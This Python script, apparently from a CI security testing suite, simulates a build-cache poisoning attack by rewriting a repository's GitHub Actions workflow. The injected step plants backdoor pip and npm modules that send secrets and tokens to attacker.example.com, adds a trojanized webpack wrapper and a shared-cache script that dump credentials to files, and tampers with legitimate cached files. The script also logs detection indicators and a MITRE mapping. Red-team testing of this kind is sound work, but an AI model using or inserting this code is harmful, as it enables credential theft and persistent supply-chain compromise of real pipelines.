#!/usr/bin/env python3
"""Attack Scenario 9.5: Cache Poisoning - Persistence Attack"""
import sys
import json
import shutil
from pathlib import Path
from datetime import datetime

class CachePoisoningAttack:
    """Poisons build cache with malicious files, persists across workflow runs, infects subsequent builds."""

    def __init__(self):
        self.repo_root = Path(__file__).parent.parent.parent.parent
        self.backup_suffix = datetime.now().strftime('%Y%m%d_%H%M%S')
        self.workflow_file = self.repo_root / ".github" / "workflows" / "ci-pipeline.yml"

    def inject_attack(self):
        """Inject cache poisoning attack into workflow."""
        if not self.workflow_file.exists():
            print(f"[!] Workflow file not found: {self.workflow_file}")
            return False

        # Backup original
        backup_file = self.workflow_file.parent / f"ci-pipeline.yml.backup_{self.backup_suffix}"
        shutil.copy2(self.workflow_file, backup_file)

        # Read workflow
        with open(self.workflow_file, 'r') as f:
            content = f.read()

        # Create cache poisoning attack step
        malicious_step = '''
      # RESEARCH ATTACK 9.5: Cache Poisoning
      - name: Restore and poison cache
        run: |
          echo "=== Restoring build cache ==="

          # Simulate cache restoration (GitHub Actions cache would be here)
          mkdir -p ~/.cache/pip || true
          mkdir -p ~/.cache/npm || true
          mkdir -p ~/.cache/maven || true
          mkdir -p ~/.gradle/caches || true

          # ATTACK 1: Poison pip cache with malicious package
          echo "[ATTACK] Poisoning pip cache..."
          mkdir -p ~/.cache/pip/http || true
          echo '#!/usr/bin/env python3
import os
import subprocess
# MALICIOUS: Backdoor in cached package
if os.environ.get("CI") == "true":
    subprocess.run(["curl", "-X", "POST", "http://attacker.example.com/exfil", "-d", "$(env | grep SECRET)"],
                   capture_output=True, timeout=5)
' > ~/.cache/pip/malicious_module.py 2>/dev/null || true

          # ATTACK 2: Poison npm cache with malicious binary
          echo "[ATTACK] Poisoning npm cache..."
          cat > ~/.cache/npm/malware.js << 'EOF' || true
// RESEARCH ATTACK: Malicious cached npm module
const { exec } = require('child_process');
if (process.env.CI) {
  exec('curl -X POST http://attacker.example.com/collect -d "$(env | grep TOKEN)"',
       (error, stdout, stderr) => {});
}
module.exports = {};
EOF

          # Create fake malicious binary
          echo "[ATTACK] Creating malicious cached binary..."
          cat > ~/.cache/npm/fake-webpack << 'EOF' || true
#!/bin/bash
# RESEARCH ATTACK: Trojanized build tool
echo "[ATTACK] Malicious webpack running..."
# Exfiltrate environment
env | grep -E "(SECRET|TOKEN|PASSWORD)" > /tmp/exfiltrated.txt || true
# Run real webpack if available
which webpack &>/dev/null && webpack "$@" || true
EOF
          chmod +x ~/.cache/npm/fake-webpack 2>/dev/null || true

          # ATTACK 3: Poison Maven cache with malicious dependency
          echo "[ATTACK] Poisoning Maven cache..."
          mkdir -p ~/.cache/maven/repository/com/malicious/lib/1.0 || true
          cat > ~/.cache/maven/repository/com/malicious/lib/1.0/lib-1.0.jar << 'EOF' || true
FAKE_JAR_WITH_MALICIOUS_CODE
This would contain actual malicious bytecode in real attack
EOF

          # ATTACK 4: Poison Docker layer cache
          echo "[ATTACK] Poisoning Docker layer cache..."
          # Simulate poisoned Docker cache
          echo "[ATTACK] SIMULATED: docker build --cache-from poisoned-image"

          # ATTACK 5: Poison Gradle cache
          echo "[ATTACK] Poisoning Gradle cache..."
          mkdir -p ~/.gradle/caches/modules-2/files-2.1/malicious.group/malicious-lib/1.0 || true
          echo "MALICIOUS_GRADLE_CACHE" > ~/.gradle/caches/modules-2/files-2.1/malicious.group/malicious-lib/1.0/lib.jar 2>/dev/null || true

          # ATTACK 6: Modify legitimate cached files
          echo "[ATTACK] Modifying legitimate cached files..."
          # Find and modify cached files
          find ~/.cache -name "*.py" -type f 2>/dev/null | head -5 | while read file; do
            echo "# RESEARCH ATTACK: Cache poisoning" >> "$file" 2>/dev/null || true
          done

          # ATTACK 7: Create persistent malicious cache key
          echo "[ATTACK] Creating persistent cache with malicious content..."
          CACHE_KEY="build-cache-v1-malicious-$(date +%Y%m%d)"
          echo "[ATTACK] Cache key: $CACHE_KEY"
          mkdir -p /tmp/cache-poison || true
          echo "MALICIOUS_PAYLOAD" > /tmp/cache-poison/backdoor.sh || true
          chmod +x /tmp/cache-poison/backdoor.sh 2>/dev/null || true

          # ATTACK 8: Poison shared team cache
          echo "[ATTACK] Poisoning shared team cache..."
          # In real scenario, this would poison cache shared across team
          mkdir -p /tmp/shared-cache || true
          cat > /tmp/shared-cache/malicious-script.sh << 'EOF' || true
#!/bin/bash
# RESEARCH ATTACK: Persistent across team builds
if [ "$CI" == "true" ]; then
  echo "[ATTACK] Running from poisoned shared cache"
  env | grep SECRET > /tmp/team-secrets.txt || true
fi
EOF
          chmod +x /tmp/shared-cache/malicious-script.sh 2>/dev/null || true

          # Log attack indicators
          echo "ATTACK_INDICATOR: cache_poisoning=true"
          echo "ATTACK_INDICATOR: pip_cache_poisoned=true"
          echo "ATTACK_INDICATOR: npm_cache_poisoned=true"
          echo "ATTACK_INDICATOR: maven_cache_poisoned=true"
          echo "ATTACK_INDICATOR: gradle_cache_poisoned=true"
          echo "ATTACK_INDICATOR: persistent_malware=true"
          echo "ATTACK_INDICATOR: cache_key=$CACHE_KEY"

          # Show poisoned cache contents
          echo "[ATTACK] Poisoned cache locations:"
          ls -la ~/.cache/pip/ 2>/dev/null | head -10 || true
          ls -la ~/.cache/npm/ 2>/dev/null | head -10 || true

          echo "[ATTACK] Cache poisoning complete - will persist across runs"
'''

        # Find insertion point (after cache restoration or before build)
        if "actions/cache@" in content:
            # Insert after cache action
            parts = content.split("actions/cache@", 1)
            remaining = parts[1]
            next_step_idx = remaining.find("\n      - name:")
            if next_step_idx != -1:
                content = (parts[0] + "actions/cache@" +
                          remaining[:next_step_idx] + malicious_step +
                          remaining[next_step_idx:])
        elif "- name: Build" in content:
            # Insert before build
            parts = content.split("- name: Build", 1)
            content = parts[0] + malicious_step + "\n      - name: Build" + parts[1]
        else:
            # Append at end if no good insertion point
            content += malicious_step

        # Write modified workflow
        with open(self.workflow_file, 'w') as f:
            f.write(content)

        print(f"[OK] Injected cache poisoning attack into {self.workflow_file.name}")
        print(f"[OK] Backup: {backup_file.name}")
        return True

    def log_indicators(self):
        """Log attack behavioral indicators."""
        indicators = {
            "attack_type": "cache_poisoning",
            "scenario_id": "9.5",
            "timestamp": datetime.now().isoformat(),
            "severity": "high",
            "indicators": {
                "cache_poisoning": True,
                "persistent_malware": True,
                "supply_chain_attack": True,
                "workflow_modified": True,
                "poisoned_caches": [
                    {
                        "cache_type": "pip",
                        "location": "~/.cache/pip",
                        "payload": "malicious_module.py"
                    },
                    {
                        "cache_type": "npm",
                        "location": "~/.cache/npm",
                        "payload": "malware.js, fake-webpack"
                    },
                    {
                        "cache_type": "maven",
                        "location": "~/.cache/maven",
                        "payload": "trojanized_jar"
                    },
                    {
                        "cache_type": "gradle",
                        "location": "~/.gradle/caches",
                        "payload": "malicious_library"
                    },
                    {
                        "cache_type": "docker",
                        "location": "docker_layer_cache",
                        "payload": "poisoned_image"
                    }
                ],
                "persistence_mechanism": "cache_reuse_across_builds",
                "infection_spread": "subsequent_builds"
            },
            "expected_detection": {
                "difficulty": "medium",
                "primary_signals": [
                    "cache_integrity_violation",
                    "unexpected_cache_contents",
                    "file_hash_mismatch",
                    "malicious_files_in_cache",
                    "cache_modification_patterns",
                    "suspicious_cached_scripts",
                    "binary_injection_in_cache"
                ],
                "detection_tools": [
                    "Cache integrity checking",
                    "File hash verification",
                    "Antivirus scanning",
                    "Dependency scanning",
                    "Cache content analysis",
                    "Build reproducibility checks"
                ]
            },
            "mitre_attack": {
                "technique": "T1584.001",
                "name": "Compromise Infrastructure: Build Infrastructure",
                "tactic": "Resource Development",
                "related": "T1195.001 - Supply Chain Compromise"
            },
            "real_world_frequency": "medium",
            "impact": {
                "persistent_compromise": "critical",
                "supply_chain_infection": "high",
                "cross_build_contamination": "high",
                "team_wide_impact": "high",
                "detection_evasion": "medium"
            }
        }

        # Save indicators
        log_dir = Path(__file__).parent.parent / "logs" / "indicators"
        log_dir.mkdir(parents=True, exist_ok=True)

        with open(log_dir / f"cache_poisoning_{self.backup_suffix}.json", 'w') as f:
            json.dump(indicators, f, indent=2)

        return indicators

    def execute(self):
        """Execute the attack."""
        print("=" * 80)
        print("ATTACK SCENARIO 9.5: Cache Poisoning")
        print("=" * 80)
        print("Severity: HIGH")
        print("Realism: 8/10 - Real supply chain risk")
        print("Impact: Persistent compromise, cross-build contamination")
        print()

        if self.inject_attack():
            self.log_indicators()
            print()
            print("[OK] Attack successfully injected!")
            print("[OK] Build caches will be poisoned with malicious files")
            print("[!] Detection: Cache integrity checks, file hash verification")
            print("[!] Persistence: Malware survives across workflow runs")
            print("=" * 80)
            return True
        else:
            print("[FAIL] Attack injection failed")
            return False

if __name__ == "__main__":
    sys.exit(0 if CachePoisoningAttack().execute() else 1)
